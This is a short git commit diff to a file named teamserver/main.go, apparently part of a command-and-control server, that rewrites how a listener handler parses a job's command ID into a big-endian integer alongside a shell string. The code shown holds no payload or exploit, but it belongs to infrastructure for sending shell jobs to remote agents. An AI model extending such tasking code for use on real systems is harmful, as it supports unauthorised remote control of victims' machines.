0343c5a0251b27150b856389e995371f029e97af
30r3y <geren_use@outlook.com>
2024-04-26 22:39:44 +0800

    new

--- teamserver/main.go
+++ teamserver/main.go
@@ -75,7 +75,8 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 				body = body[4:]
 				id := int(body[0])
 				var job Job
-				job.command = uint16(body[1])<<8 | uint16(body[2])
+				job.command = binary.BigEndian.Uint16(body[1:3])
+
 				job.shell = string(body[3:])
 				job.funny = true
 
